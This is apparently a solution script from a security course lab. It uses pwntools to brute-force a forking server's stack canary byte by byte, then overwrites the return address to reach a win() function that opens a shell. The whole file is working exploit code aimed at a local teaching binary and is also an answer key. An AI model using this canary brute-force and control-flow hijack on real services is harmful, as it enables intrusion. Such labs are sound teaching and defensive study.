#!/usr/bin/env python3
"""Solution for canary_server: byte-by-byte canary brute force (lecture Attack #1).

The forking server shares one canary across all children, so we recover it
one byte at a time, then overwrite the return address past it to reach win().

Oracle: the child prints "OK" only when handle() returns (canary intact). A
wrong guess corrupts the canary -> abort -> no "OK".

Start the server first:
    ./canary_server &
Then run:
    python3 solution3/solve_canary_server.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="warn")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "canary_server")
HOST, PORT = "127.0.0.1", 4004

elf = ELF(BIN, checksec=False)


def survives(payload):
    """Send payload on a fresh connection; True if the child returned ('OK')."""
    io = remote(HOST, PORT)
    io.send(payload)
    try:
        data = io.recvall(timeout=1)
    except EOFError:
        data = b""
    io.close()
    return b"OK" in data


def find_offset():
    """Largest all-'A' fill that still returns OK == distance from buf to canary."""
    n = 1
    while survives(b"A" * n):
        n += 1
    off = n - 1
    log.warn("offset(buf -> canary) = %d", off)
    return off


def leak_canary(offset):
    """Recover the 4 canary bytes; a correct prefix leaves the rest intact."""
    canary = b""
    while len(canary) < 4:
        for b in range(256):
            if survives(b"A" * offset + canary + bytes([b])):
                canary += bytes([b])
                break
        else:
            log.error("canary byte %d not found", len(canary))
    log.warn("canary = %s", canary.hex())
    return canary


def main():
    offset = find_offset()
    canary = leak_canary(offset)

    # buf | canary(4) | saved ebp(4) | return address
    payload = b"A" * offset + canary + b"B" * 4 + p32(elf.symbols["win"])

    io = remote(HOST, PORT)
    io.send(payload)
    io.recvuntil(b"win! spawning shell")
    log.success("canary bypassed -- shell open")
    io.sendline(b"id; echo CANARY_PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
